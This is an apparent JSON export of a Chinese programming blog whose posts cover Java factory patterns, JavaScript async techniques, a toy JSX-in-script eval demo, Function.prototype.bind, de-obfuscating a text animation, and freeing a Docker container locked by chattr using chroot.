这里因为逻辑很简单，所以工厂的生产方法只是简单返回实体class CatFactory implements PetFactory &#123; @Override public Pet createPet() &#123; return new Cat(); &#125;&#125;class DogFactory implements PetFactory &#123; @Override public Pet createPet() &#123; return new Dog(); &#125;&#125; 这样，客户端的代码可以这样写 123456public static void main(String[] args) &#123; PetFactory catFactory = new CatFactory(); PetFactory dogFactory = new DogFactory(); catFactory.createPet().say(); dogFactory.createPet().say();&#125; 在定义工厂的引用时，类型可直接定义为 PetFactory 接口，然后利用多态的特性来分发具体的工厂。这样一来，我们定义了一个用于创建对象的接口，让子类来决定实例化哪一个类。工厂方法使一个类的实例化延迟到其子类。 和简单工厂模式不同的是，工厂方法模式的客户端做了更多的工作，它需要知道某个实体类对应的具体工厂类。同时，在对实体类的种类进行扩展时，要同时定义这个新的实体类和其对应的工厂类。这样的缺点在于代码量比较大，修改的工作相对于简单工厂模式而言稍有复杂，而优点则在于解决了之前说的问题。即，遵循了“封闭-开放原则”，同时，通过添加新的类而不是修改原有的类来进行业务的扩展，使得按需编译成为可能，减少了开发的成本。 0x2 抽象工厂模式抽象工厂模式的定义是为创建一组相关或相互依赖的对象提供一个接口，并且无须指定它们的具体类，从字面意义上来理解，就可以理解为工厂方法模式的加强。也就是说，此时工厂的目标在于创建一系列相互影响或关联的实体类，我们把这些类叫做产品，而由于工厂的具体实现不同，所以同类产品也有着一定的差异，在这个横向的对比上，我们把它们叫做一个产品族。 一般来说，抽象工厂模式适用于比较大的项目。比如可以定义一套跨平台的业务接口，让工厂来生产BO们，共同配合以实现某个功能。那么针对不同的平台，就可以有不同的工厂来屏蔽平台之间的差异。而站在客户端的角度，我们只需要结合多态来实例化目标平台的工厂类，就可以通过通用的接口来完成所需的功能。在这个过程中，尽管工厂生成的产品们联系密切，但客户端依然不需要了解产品族中各产品之间的具体差异。 这即是说，抽象工厂模式把更多的工作放到了接口实现方这边。对于“功能扩展”这项工作，抽象工厂模式可以分为产品扩展和产品族扩展两种。可以发现，产品的扩展其实违背了“开放-封闭原则”，因为它不但要修改工厂接口，还要修改每个现有的工厂实现类；而产品族的扩展则十分优雅，因为抽象工厂模式主打的就是扩展产品族嘛。","categories":[{"name":"设计模式","slug":"设计模式","permalink":"/categories/设计模式/"}],"tags":[]},{"title":"CallBack 与 Promise 与 Generator 与 async/await 的故事","slug":"AsyncJavascript","date":"2020-09-29T12:58:40.000Z","updated":"2022-06-12T03:35:53.716Z","comments":true,"path":"2020/09/29/AsyncJavascript/","link":"","permalink":"/2020/09/29/AsyncJavascript/","excerpt":"","text":"0x0 前言之前在读 express 相关的项目时经常看到 async/await 关键字，所以就跑去查了一下文档，看完以后还是觉得云里雾里；前几天偶然看到阮一峰老师的一篇文章，文章中整理了当前 Javascript 处理异步的一些方式，并作了一些对比，尤其最后在提到 async/await 时使用 Generator 去模拟其行为，顿时觉得茅塞顿开。 于是这篇文章就作为一个简单的总结+个人的一些理解，就这样开始写下去了。 0x1 关于 Javascript 的异步之前有看到所谓 “异步就是多线程” 的言论，但是在上文提到的文章中，作者把异步看作是一种可以在两个任务中互相切换（并传递信息）的一种模式（这里的任务指按顺序执行的一段序列），那么根据这个思想，其实 Generator 的模式就可以看作是一种异步，于是它在配合 Javascript 的事件循环（Event Loop）后就可以做到一些奇妙的效果，详见下文。 众所周知，Javascript 是一门单线程的语言，这句话多少都令人有些疑惑（或者可能单纯是我比较愚钝），比如像 NodeJS 的 fs.readFile ，在 CallBack 被调用前，这个 “唯一” 的线程难道还是要自己去与文件系统交互吗；或者对于 setTimeout ，这个 “唯一” 的线程难道会通过在用户的代码中插入轮询来进行计时吗。 事实上，这里所谓的单线程指的是用户代码所在的线程（这里姑且称之为主线程），而对于计时器、文件读取这类的操作，Javascript 依然有相应的线程来完成这些任务。也就是说，用户的代码并不能进入到这些线程中来执行，但是可以通过 API 来委托它们执行任务，那么就需要一种方式，使得这些线程在执行完相应的任务后能通知到主线程，对于这种方式，首先能想到的就是 CallBack。 0x2 关于 CallBackCallBack 并不是专门用来解决异步问题的，它只是一个被作为参数传递给另一个函数的函数，这样看来其实像 Decorator 这种的都可以算作是一种 CallBack。 回到异步的话题上，在 Javascript 的一种异步模式中，CallBack 用于告知对应的任务线程，在执行完主线程分发的任务后调用之，从而让执行流回到主线程中。比如前文所述的 readFile，对应的代码大概如下: 1234const &#123; readFile &#125; = require('fs')readFile(..., (err, data) =&gt; &#123; ...&#125;) 这里 readFile 的第二个参数就是一个 CallBack，它委托与文件系统交互的线程去读取由第一个参数指明的文件。在它执行任务的期间，有可能成功也有可能失败，所以 NodeJs 大部分的 CallBack 的第一个参数都用来记录错误，后面的则用来处理成功后获取到的数据，在我看来这是一个非常优雅的模式，它并没有什么心智负担，写起来非常自然。 但是一旦异步的操作有了前后的顺序依赖，事情就变得不尽人意了，鼎鼎大名的回调地狱（CallBack Hell）就是由此产生的，还是之前读文件的例子，比如业务一定要按照 file1 -&gt; file2 -&gt; file3 -&gt; ... 这样的顺序来进行的话，那么回调就会一层套用一层，最终的结果是代码变得横向发展，这是十分不美观且难以维护的状态。 于是 Promise 出现了。 0x3 关于 PromisePromise 其实是一种新的回调模式，网络上有大量相关的 polyfill，看一下代码就可以明白内部的基本原理（这里特别推荐一下 yaku 这个库，贺老曾对此有过很高的评价）。 这里额外说明一件事，就是虽然 Promise 在大部分的实现里都以微任务来执行，但是标准中并没有提及这件事，以至于我见过的 polyfill 基本都是用 setTimeout 来模拟的，所以在写业务的时候其实不能过分依赖这一点。 回到上面的异步顺序依赖的问题，对于那种逻辑，如果用 CallBack 来写的话，大概是这个样子: 1234567891011121314151617181920212223const &#123; readFile &#125; = require('fs')readFile('file1', (err, data) =&gt; &#123; if (err) &#123; ... &#125; console.log(`File1 content: $&#123;data&#125;`) readFile('file2', (err, data) =&gt; &#123; if (err) &#123; ... &#125; console.log(`File2 content: $&#123;data&#125;`) readFile('file3', (err, data) =&gt; &#123; if (err) &#123; ... &#125; console.log(`File3 content: $&#123;data&#125;`) readFile('...', (err, data) =&gt; &#123; ... &#125;) &#125;) &#125;)&#125;) 这里仅仅读取了三个文件，代码的缩进就已经到了很深的程度了，而且冗余性特别大，尽管对于这个样例，错误处理的逻辑可能是完全一样的，每个回调对应的错误还是要分别处理。 而同样的逻辑，如果用 Promise 写出来是这样的: 1234567891011121314151617const &#123; readFile &#125; = require('fs').promisesreadFile('file1', &#123; encoding: 'utf8' &#125;).then(data =&gt; &#123; console.log(`File1 content: $&#123;data&#125;`) return readFile('file2', &#123; encoding: 'utf8' &#125;)&#125;).then(data =&gt; &#123; console.log(`File2 content: $&#123;data&#125;`) return readFile('file3', &#123; encoding: 'utf8' &#125;)&#125;).then(data =&gt; &#123; console.log(`File3 content: $&#123;data&#125;`)&#125;).catch(err =&gt; &#123; ...&#125;) 可以看到，Promise 很优雅地解决了上面说的两个问题，拯救被回调地狱折磨的前辈们于水火之中。 0x4 更进一步虽然 Promise 很优雅，可以很好地解决上面提到的问题，但是一个是因为程序员比较懒，一个是因为 Promise 写多了确实有点烦，所以大家就又开始找新的解决顺序依赖的方式。 先说为什么比较烦，上面的例子因为逻辑很简单，而且只有三个显式的顺序依赖所以可能不太明显，但是想象一下如果顺序很多，那么代码里基本上全是 then then then，一个是放眼望去基本看不出主要的逻辑，另一个是…顺序依赖其实是一个挺大众的需求，如果有一个语法糖能提供更好的支持，那真的是一件令人高兴的事情。 于是我们的主角就出场了，它叫 await ，平时只喜欢和 async 待在一起，对于具体的用法稍稍 STFW 一下就有很多，所以我比较想从 Generator + Promise 的角度来描写它，那么下面就先来说一下 Generator。 0x5 关于 GeneratorGenerator 这个概念（机制）也不是 Js 这门语言独有的，比如 Python 中就有同样的机制。在 Js 中，一个 Generator 是一个带星号的函数，内部可以通过 yield 关键字来“送出”和“接收”数据，它大概长下面的样子，这里就不详细介绍它了，具体的机制可以看相关的文档。 123456789function *ImaGenerator () &#123; const data = yield \"Send data from generator\" console.log(\"Get data from main:\", data)&#125;const gen = ImaGenerator()console.log(\"Get data from generator:\", gen.next().value)gen.next(\"Send data from main\") 可能是由于代码量比较少，平时写的时候还没用实际到过这项技术，不过我还是比较感谢曾经学习了它的自己，让我能够借助它来更好地理解 async/await。 前面说过，异步可以被理解成是一种在两个顺序流程之间切换并传递信息的运行模式，那么如果把这个思想落实到 Generator 上就可以发现，yield 关键字既可以让流程从 Generator 中切换到外部执行流，又可以携带特定的信息；next 方法在另一方面使得流程回到 Generator 中成为可能。 于是，通过观察前面 CallBack 和 Promise 阅读文件的例子，就可以发现其具备特定的规律，从而结合 Generator 写出如下的代码： 123456789101112131415161718192021222324252627282930313233// callback + generator 的例子function Thunkify (fn) &#123; return function argExceptCb (...args) &#123; return function argIncludeCb (cb) &#123; fn.call(fn, ...args, cb) &#125; &#125;&#125;const fs = require('fs')const readFile = Thunkify(fs.readFile)function *readFiles (...filenames) &#123; for (fn of filenames) &#123; const content = yield readFile(fn) console.log(content) &#125;&#125;function runThunkifyGen (gen) &#123; function next (err, data) &#123; const ret = gen.next(data) if (ret.done) return ret.value(next) &#125; next()&#125;runThunkifyGen(readFiles('file1', 'file2', 'file3'))console.log('Read done') 123456789101112131415161718192021// promise + generator 的例子const &#123; readFile &#125; = require('fs').promisesfunction autorun (gen) &#123; (function next (data) &#123; const ret = gen.next(data) if (ret.done) return ret.value.then(data =&gt; next(data.toString())) &#125;)()&#125;function *readFiles (...filenames) &#123; for (fn of filenames) &#123; const content = yield readFile(fn) console.log(content) &#125;&#125;autorun(readFiles('file1', 'file2', 'file3'))console.log(\"Read done\") 例子中的 autorun 和 runThunkifyGen 函数被称为 执行器，用于自动将流程在 Generator 和调用方之间切换，并保证读取的文件顺序。 可以看到，实际上执行器就是提取出了 callback 和 then 的部分，在这里用户需要关注的只有 readFiles 这一个函数，而两个例子中，readFiles 长得一模一样。 那么如果我们把目光着眼于更一般的场景，是否可以结合 Generator 和执行器来让其达到普适呢？答案是可以的，下面给出代码： 12345678910111213141516171819function async (fn) &#123; function step (gen, data) &#123; try &#123; var next = gen.next(data) &#125; catch (err) &#123; return Promise.reject(err) &#125; return next.done ? Promise.resolve(next.value) : Promise.resolve(next.value) .then(data =&gt; step(gen, data)) &#125; return function () &#123; const gen = fn() return step(gen) &#125;&#125; async 函数接受一个 Generator，然后返回一个新的函数，这个函数在内部递归调用 step，这个 step 其实就是执行器（其实可以通过 IIFE 使得 step 变成单例，不过这里就不考虑这些了）。 和上面不同的地方在于，前面的两个都分别假定了 yield 后面跟随的要么是一个 thunk，要么是一个promise，而 async 则支持 yield 后面跟随一般值，能做到这一点的原因在于 Promise.resolve 和 Promise.reject ，其具体的机制可以查看MDN。 那么该如何使用 async 呢，继续回到之前按顺序打开并读取文件的例子，我们的代码会变成这样： 12345678910const &#123; readFile &#125; = require('fs').promises const func1 = async(function *() &#123; const data1 = yield readFile('file1') const data2 = yield readFile('file2') const data3 = yield readFile('file3') console.log('data1:', data1.toString()) console.log('data2:', data2.toString()) console.log('data3:', data3.toString())&#125;) 已经对 async/await 有所了解的小伙伴可以发现，同样的逻辑，如果使用这一对新人，则代码会变成这样： 12345678910const &#123; readFile &#125; = require('fs').promisesconst func2 = async function() &#123; const data1 = await readFile('file1') const data2 = await readFile('file2') const data3 = await readFile('file3') console.log('data1:', data1.toString()) console.log('data2:', data2.toString()) console.log('data3:', data3.toString())&#125; 很相似，对吧？","categories":[{"name":"前端","slug":"前端","permalink":"/categories/前端/"}],"tags":[]},{"title":"一个关于 script 标签的 type 属性的另类用法","slug":"ScriptType","date":"2020-09-25T13:33:18.000Z","updated":"2022-06-12T03:35:53.716Z","comments":true,"path":"2020/09/25/ScriptType/","link":"","permalink":"/2020/09/25/ScriptType/","excerpt":"","text":"0x00 前言今天出于好奇跑去 React 官网转了一圈，看到里面提供了一个 无需构建工具 的体验例子，看到代码后感觉很神奇，因为它直接在 script 里的 render 函数中写入了 JSX ，并且成功渲染到了视图里，但是这种语法显然不是被允许的，红色的 Uncaught SyntaxError: expected expression, got &#39;&lt;&#39; 是应该出现在 console 中的。 0x01 原理及实现思来想去，突然发现 script 中的 type 标签里并不是常规的 text/javascript ，而是非标准的 text/babel ，那么这个东西有什么影响呢？ 其实把这段代码复制到一个带语法高亮的编辑器中应该就能看到异样了，比如扔进我本地使用的 vscode 时就可以发现，script 标签中并没有提供语法高亮和代码补全功能。 STFW 后得知，对于这种 type ，浏览器不会将其看作将被执行的 script ，而是当作普通的标签元素来看待，而既然这里的 type 是 babel，上面的 script:src 也引入了 babel ，那么想来编译并执行这段纯文本就是它的工作了。 知道了这个原理后，就可以写出简单的渲染方法了，代码如下： 1234567891011121314151617181920212223242526272829&lt;!-- HTML 文件 --&gt;&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;title&gt;Render-Test&lt;/title&gt; &lt;script src=\"render.js\"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"app\"&gt;&lt;/div&gt; &lt;script type=\"text/react\"&gt; console.log(\"Output msg to console\") render( &lt;div&gt; &lt;h1&gt;Hello, React!&lt;/h1&gt; &lt;spanInputBox&lt;/span&gt; &lt;input type=\"text\"&gt; &lt;button onclick=\"alert('Hello!')\"&gt;clickMe&lt;/button&gt; &lt;/div&gt;, document.getElementById('app') ) &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; render.js 文件内容如下： 1234567891011121314151617window.onload = function () &#123; const pattern = /\\s*render\\s*\\(\\s*(&lt;.+&gt;)/gs const scriptList = document.querySelectorAll('script[type=\"text/react\"]') globalThis.render = function (template, node) &#123; node.innerHTML = template &#125; for (let script of scriptList) &#123; eval(script.textContent.replaceAll( pattern, (_, template) =&gt; `;render(\\`$&#123;template&#125;\\`` )) &#125;&#125; 大概思路就是找到所有 type 相符的 script 标签，给 jsx 的部分加上引号，然后把整坨内容扔进 eval 里跑一下，当然现实中肯定不会这么简单粗暴，这里只能说是一个 POC 吧。 0x02 总结没什么总结的，就是闲着没事水了一篇博客而已（","categories":[{"name":"前端","slug":"前端","permalink":"/categories/前端/"}],"tags":[]},{"title":"测试 Github Actions","slug":"GitActionsTest","date":"2020-09-03T06:15:11.000Z","updated":"2022-06-12T03:35:53.716Z","comments":true,"path":"2020/09/03/GitActionsTest/","link":"","permalink":"/2020/09/03/GitActionsTest/","excerpt":"","text":"Congratulations to myself :-)","categories":[{"name":"杂项","slug":"杂项","permalink":"/categories/杂项/"}],"tags":[]},{"title":"记一次手贱的经历与解决办法","slug":"Docker-Chattr","date":"2020-09-01T02:01:35.000Z","updated":"2022-06-12T03:35:53.716Z","comments":true,"path":"2020/09/01/Docker-Chattr/","link":"","permalink":"/2020/09/01/Docker-Chattr/","excerpt":"","text":"0x0 起因一直以来对 Linux 的权限管理都仅仅停留在 “知道有这种机制存在” 的程度上，最近为某比赛出题时因为要有 getshell 的环境，所以就趁机了解了一下其中的一些理论和对应的命令。 由于我本人平时使用的是 MacOS 系统，再加上赛题环境也要扔到 docker 中，所以在学习权限管理时在 docker 里开了一个容器作为环境，测试的命令包括 chown，chroot，lsattr，chattr… 等等（这里插一句题外话，为了在容器中运行 chattr ，需要在启动时加上 --cap-add LINUX_IMMUTABLE 参数来为其赋予一个 capability ），在了解到可以开始创建赛题环境的程度后，我退出了容器，并运行了 docker rm ... 来将测试用的容器删除掉。 正当我准备开始输入命令创建新的容器时，却看到 docker 并没有正常删除测试用容器，取而代之地返回了一条蜜汁信息（这里省略了容器对应的两个哈希，该哈希对应我上文提到的那个用于测试权限管理的容器）： 1Error response from daemon: container ...: driver \"overlay2\" failed to remove root filesystem: unlinkat /var/lib/docker/overlay2/.../diff/test/file: operation not permitted 可以看到，大意是 docker 没有权限删除容器中的 /test/file 文件，比较幸运地，我记得这个文件是经历了 chattr +a file 处理后的文件，这个隐藏属性使得文件只可被追加新的内容而不可被删除或者修改。 起初我觉得这个问题很好解决（实际也很好解决，只不过和我开始想的不同），如果是在 docker for linux 上，直接在宿主机切到对应的目录后运行 chattr -a file 去掉隐藏属性，然后继续运行 docker rm ... 删掉容器即可；docker for macos 无非就是多了一层 HyperKit，可以用 screen 进入到 vm 中（我本机上是 screen ~/Library/Containers/com.docker.docker/Data/vms/0/tty），然后进行和上文相同的操作。 然而进去才发现，这个 vm 提供的命令太少了，根本没有 chattr 命令可用，尝试搜索是否有等效的命令可用也没有搜到，更没有人手贱到和我一样，所以现在的场景也没有先人的经验可以学习。虽然这一个容器本身并没有占多大的空间，但是强迫症使然，我还是想把它删除掉:-P 0x1 解决办法0x10 Hard Reset最初我尝试自己在 StackOverflow 上提出了这一问题，然而也不知道是因为环境描述的不到位还是因为自己小学水平的英文写作能力，下面的答复甚至都没有对应到这个问题上… 只有一位老哥给了还算靠谱的答复，他建议我强制重置 docker desktop for mac 的状态（Troubleshoot/Reset disk image 或者 Troubleshoot/Reset to factory defaults），这俩都会清空当前的所有的镜像和容器，后者还会顺手把应用重置成刚被安装后的状态。 确实是一个解决办法，不过因为我平时都是把 docker 当虚拟机用的，所以本机上存着各种镜像，其中还包括好多自定制的，一个一个导出来实在是太过麻烦，而我又不怎么了解这些镜像是怎么个存储机制，胡乱备份的话还担心弄出别的问题，所以就放弃了这个办法。 0x11 Chroot在 vm 里畅游了一阵子后，我偶然发现这货还是有 chroot 可以用的，于是随便切到一个包含根目录的容器层里（我本机的路径是 /var/lib/docker/overlay2/.../diff ，这里依然省略了哈希），试着执行了一下 chroot . /bin/bash ，虽然给了一条 groups: cannot find name for group ID 11 的奇怪信息，不过还是顺利地进入到了 bash 环境中，而且测试了一下后发现 chattr 命令可用。 这样的话就好办多了，在无法删除的文件所在的文件夹或父文件夹中构建出 chattr 的运行环境，然后利用 chroot 运行 chattr -a file 来删除文件的隐藏属性，再在宿主机中运行 docker rm ... 即可 在其他容器中（下文用 other 来指代）用 ldd 查看下 chattr 依赖的动态链接库，得到结果如下： 1234567root@docker-desktop:/# ldd $(which chattr) linux-vdso.so.1 (0x00007ffebb9fc000) libe2p.so.2 =&gt; /lib/x86_64-linux-gnu/libe2p.so.2 (0x00007f6ce8b0a000) libcom_err.so.2 =&gt; /lib/x86_64-linux-gnu/libcom_err.so.2 (0x00007f6ce8906000) libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f6ce8515000) libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f6ce82f6000) /lib64/ld-linux-x86-64.so.2 (0x00007f6ce8f17000) 可以看到依赖库都在 /lib/x86_64-linux-gnu/ 和 /lib64/ 文件夹中，所以在目标文件夹（这里指无法删除的文件 file 所在的文件夹）中用 cp -R 把 other 中这两个文件夹中的内容拷贝过来，再把 chattr 的 ELF 文件拷到目标文件夹中，最后在目标文件夹中运行 chroot . ./chattr -a file 即可。 删除了隐藏属性后，切回到宿主机中，然后运行 docker rm ... 就可以顺利删除掉这个出了问题的容器了。","categories":[{"name":"Docker","slug":"Docker","permalink":"/categories/Docker/"}],"tags":[]},{"title":"CTF练习集","slug":"CTF-Exercises","date":"2020-08-04T03:50:11.000Z","updated":"2022-06-12T03:35:53.716Z","comments":true,"path":"2020/08/04/CTF-Exercises/","link":"","permalink":"/2020/08/04/CTF-Exercises/","excerpt":"","text":"window.location = \"https://www.cnblogs.com/yuren123/\" 如果看到这段话，说明自动跳转没有作用，请访问链接","categories":[{"name":"CTF","slug":"CTF","permalink":"/categories/CTF/"}],"tags":[]},{"title":"函数 Function.prototype.bind 的几个场景","slug":"FunctionBind","date":"2020-08-04T01:54:30.000Z","updated":"2022-06-12T03:35:53.716Z","comments":true,"path":"2020/08/04/FunctionBind/","link":"","permalink":"/2020/08/04/FunctionBind/","excerpt":"","text":"0x0 前言一直以来都没想到 bind 函数的具体应用场景，最近读某源码时偶然在一个类声明中看到了下面第一个场景中的代码，由此联想到了一些其他内容，这里记录一下 0x1 第一个场景相关的核心代码如下 1234// 类名为 Directivethis._update = function (val) &#123; this.update(val) //该方法同样被定义在该类中，用于更新属性，这里因篇幅原因不给出&#125;.bind(this) 该方法在这个类之后的代码中被作为回调函数传给了另一个 Watcher 对象，代码如下 1var watcher = this._watcher = new Watcher(..., this._update) 这个 Watcher 对象将 _update 函数作为一个属性保存在了自己的作用域中，并在用户触发相应的事件后执行回调。 这个场景下的本意是 Watcher 在监测到事件发生后调用 Directive._update 方法来更新对应的 Directive 实例中的属性，然而我们知道，Javascript 中的 this 是会根据上下文进行变化的（这里不考虑箭头函数等特殊情况），当 Watcher 把 _update 作为自己的属性时，这个 this 就从 Directive 变成 Watcher 了，之后的更新也都会发生在 Watcher 中，这显然偏离了本意。 而 bind 的作用在于，它强制绑定了代码中 this 的值，使这个函数在赋值给其他对象作为属性且通过该对象进行调用时依然以 bind 中的参数作为 this ，在这里就达到了场景本身的需求。 0x2 第二个场景上面的例子并不是一个经常会遇到的场景，下面给出一个更普遍一些的情况：假设我们在视图中有一系列按钮通过绑定事件来操作一个 Object 中的属性，由于在 js 的逻辑中也有可能用到同样的属性操作，所以这些操作可以作为该对象的方法，然后将该方法作为回调函数传给对应的 Listener ，代码大概如下 12345678910// 这段代码因为没有具体上下文所以可能显得有些刻意，不过足够说明问题本身了let runTime = new (function() &#123; this.data = 0 this.addData = function() &#123; this.data++; &#125;&#125;)();let btn = document.querySelector('#btn-addData');btn.onclick = runTime.addData; 这里试图在点击一个按钮后将 runTime.data 自增，在将回调函数绑定到 click 事件时使用了 btn.onclick = runTime.addData 这样的语句，然而需要注意的是，在绑定后，addData 中的 this 就不再是 runTime ，而是 btn 了，这样在点击后就会尝试递增 btn.data ，从而偏离了本意。 正确的做法和前面的例子一样，应该在 addData 的函数定义后加入 .bind(this) 语句，从而将 this 强制绑定为 runTime 对象。 0x3 第三个场景另外上面给出的 MDN 的链接中也有几个场景，不过我认为其中受用面最大的应该是 “快捷调用” 的场景，这里为了查阅方便来转述一下 场景的意图在于给经常调用的长对象方法提供一个捷径，比如想通过 Array.prototype.slice 来将一个类数组对象转换为真正的数组时，常规写法可能是 123var slice = Array.prototype.slice...slice.apply(arguments) 但是当这个函数需要经常被调用时，slice.apply 的写法还是有些令人厌烦，这时可以利用 bind 来将 apply 的 this 绑定为 Array.prototype.slice（这个 this 指的是 “apply 作为谁的方法被调用” 中的 “谁” 而不是 apply 的第一个参数），从而通过直接调用绑定后的函数（包装函数）来达到目的，代码如下 123var slice = Function.prototype.apply.bind(Array.prototype.slice)...slice(arguments) 这样就缩短了调用方法时所需的长前缀，写起来就能更愉快一些。","categories":[{"name":"前端","slug":"前端","permalink":"/categories/前端/"}],"tags":[]},{"title":"记一段 Js 代码的解读与思考","slug":"JS-Inspection","date":"2019-12-11T08:30:23.000Z","updated":"2022-06-12T03:35:53.716Z","comments":true,"path":"2019/12/11/JS-Inspection/","link":"","permalink":"/2019/12/11/JS-Inspection/","excerpt":"","text":"0x0 前言最近逛别人博客的时候，偶然看到了下面这货： 立刻就被这个简约的小东西给吸引住了，于是对着它就是一发审查元素，想看看其具体的实现，在把主要的部分提取出来后得到如下内容： 1234567891011121314&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Test&lt;/title&gt; &lt;meta charset=\"utf8\"&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"binft\"&gt;&lt;/div&gt; &lt;script&gt; var binft=function(e)&#123;function m(a)&#123;for(var d=document.createDocumentFragment(),c=0;a&gt;c;c++)&#123;var b=document.createElement(\"span\");b.textContent=String.fromCharCode(94*Math.random()+33);b.style.color=f[Math.floor(Math.random()*f.length)];d.appendChild(b)&#125;return d&#125;function g()&#123;var d=h[a.skillI];a.step?a.step--:(a.step=k,a.prefixP&lt;b.length?(0&lt;=a.prefixP&amp;&amp;(a.text+=b[a.prefixP]),a.prefixP++):\"forward\"===a.direction?a.skillP&lt;d.length?(a.text+=d[a.skillP],a.skillP++):a.delay?a.delay--:(a.direction=\"backward\",a.delay=l):0&lt;a.skillP?(a.text=a.text.slice(0,-1),a.skillP--):(a.skillI=(a.skillI+1)%h.length,a.direction=\"forward\"));e.textContent=a.text;e.appendChild(m(a.prefixP&lt;b.length?Math.min(c,c+a.prefixP):Math.min(c,d.length-a.skillP)));setTimeout(g,n)&#125;var b=\"\",h=\"\\u9752\\u9752\\u9675\\u4e0a\\u67cf\\uff0c\\u78ca\\u78ca\\u6da7\\u4e2d\\u77f3\\u3002 \\u4eba\\u751f\\u5929\\u5730\\u95f4\\uff0c\\u5ffd\\u5982\\u8fdc\\u884c\\u5ba2\\u3002 \\u6597\\u9152\\u76f8\\u5a31\\u4e50\\uff0c\\u804a\\u539a\\u4e0d\\u4e3a\\u8584\\u3002 \\u9a71\\u8f66\\u7b56\\u9a7d\\u9a6c\\uff0c\\u6e38\\u620f\\u5b9b\\u4e0e\\u6d1b\\u3002 \\u6d1b\\u4e2d\\u4f55\\u90c1\\u90c1\\uff0c\\u51a0\\u5e26\\u81ea\\u76f8\\u7d22\\u3002 \\u957f\\u8862\\u7f57\\u5939\\u5df7\\uff0c\\u738b\\u4faf\\u591a\\u7b2c\\u5b85\\u3002 \\u4e24\\u5bab\\u9065\\u76f8\\u671b\\uff0c\\u53cc\\u9619\\u767e\\u4f59\\u5c3a\\u3002 \\u6781\\u5bb4\\u5a31\\u5fc3\\u610f\\uff0c\\u621a\\u621a\\u4f55\\u6240\\u8feb\\uff1f\".split(\" \").map(function(a)&#123;return a+\"\"&#125;),l=2,k=1,c=5,n=75,f=\"rgb(110,64,170) rgb(150,61,179) rgb(191,60,175) rgb(228,65,157) rgb(254,75,131) rgb(255,94,99) rgb(255,120,71) rgb(251,150,51) rgb(226,183,47) rgb(198,214,60) rgb(175,240,91) rgb(127,246,88) rgb(82,246,103) rgb(48,239,130) rgb(29,223,163) rgb(26,199,194) rgb(35,171,216) rgb(54,140,225) rgb(76,110,219) rgb(96,84,200)\".split(\" \"),a=&#123;text:\"\",prefixP:-c,skillI:0,skillP:0,direction:\"forward\",delay:l,step:k&#125;;g()&#125;;binft(document.getElementById('binft')); &lt;/script&gt;&lt;/body&gt; 其中 js 的部分经历了压缩，随便找了个在线解压工具尝试格式化后，终于获得了一份勉强能看的代码。而由于最近刚刚了解了 js 混淆的含义与作用，这份代码又刚好经过了不太难的混淆处理，故准备拿它开刀，尝试自己分析一下。 0x1 相关问题0x10 恼人的条件表达式首先比较麻烦的就是 1a.step ? a.step--:(a.step = k, a.prefixP &lt; b.length ? (0 &lt;= a.prefixP &amp;&amp; (a.text += b[a.prefixP]), a.prefixP++) : \"forward\" === a.direction ? a.skillP &lt; d.length ? (a.text += d[a.skillP], a.skillP++) : a.delay ? a.delay--:(a.direction = \"backward\", a.delay = l) : 0 &lt; a.skillP ? (a.text = a.text.slice(0, -1), a.skillP--) : (a.skillI = (a.skillI + 1) % h.length, a.direction = \"forward\")) 这一坨迷之表达式了，对我而言非常有必要将其转换成普通的 if-else 语句，于是尝试 STFW 后得到如下三只： OpenGG 的 转换工具(会转成 IIFE) raybb 的 转换工具(需要用空格分隔关键字) website-dev.eu 的转换工具(需要科学上网，或手动换源) 然而如上所述，三位前辈的工具都有着各自的问题，先抛开 IIFE 的可读性不说，后面两只并没有支持诸如 1?(2?3:4,3?4:5):6 这样的平行语句，因此并不能处理上面的表达式，考虑到未来可能还会有类似的需求，故以解决上述情况为主要目标，掏出 Python 一顿乱敲产出了如下脚本（TL;DR）： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374# 引号中输入想要处理的内容tmp = \"\"# 预处理 删除所有空格 方便后面判断左右是否有括号tmp = tmp.replace(' ', '')# 将一组语句在考虑括号的前提下以逗号再分组def getSplitContent(tmp): balance = 0 indexs = [] words = [] for i in range(len(tmp)): if tmp[i] == '(': balance += 1 elif tmp[i] == ')': balance -= 1 elif tmp[i]==',' and balance==0: indexs.append(i) # 手动切分 因为 str 是不可变对象 暂时没有好办法 i = -1 for j in indexs: words.append(tmp[i+1:j]) i = j else: words.append(tmp[i+1:]) return words# 获得 tmp 中和 ? 匹配的 : 符号def getIndex(tmp): balance = 0 for i in range(len(tmp)): if tmp[i] == '?': balance += 1 elif tmp[i] == ':': balance -= 1 if balance == 0: return i else: return -1def fun(input, n=0): if input.startswith('(') and input.endswith(')'): input = input[1:-1] tab = ' '*n splitTmp = getSplitContent(input) for tmp in splitTmp: # 没找到则说明当前语句不可再分 left = tmp.find('?') if left == -1: print(\"%s%s;\"%(tab, tmp)) continue # 没找到则说明条件表达式不完整 right = getIndex(tmp) if right == -1: print(\"Error\") exit() # 打印当前层的 if-else 语句并递归处理子句 print(\"%sif (%s) &#123;\"%(tab, tmp[:left])) fun(tmp[left+1:right], n+1) print('%s&#125; else &#123;'%tab) fun(tmp[right+1:], n+1) print('%s&#125;'%tab)fun(tmp) 主要思路比较简单，就是以括号为基准挑选出可作为分隔符的逗号，并以此对语句进行分组后再递归处理，唯一比较坑的地方是 python 中 str 属于不可变对象，因此这里只好采用记录下标并手动拆分的办法= = 同时，受上面前辈的启发，觉得可以在博客里开个 杂项 的板块，里面放一些小脚本等与博客本身没什么关系的东西，这样既方便日后的使用，也可以作为一种练习，嗯，可喜可贺。 把上面的一坨表达式丢进脚本里，再用运行后的结果替换之，可以发现这个名为 g 的函数就是逻辑的主要部分了。 0x11 setTimeout 以及 js 事件循环机制结束替换的工作后，就可以开始读代码了。考虑到实际的效果，能够猜到代码里包含着类似循环的部分，可是尝试搜索 for 和 while 时都没有找到任何内容。在仔细阅读后，终于发现在上面转换出来的 g 函数里静静地躺着一只 setTimeout(g, n) 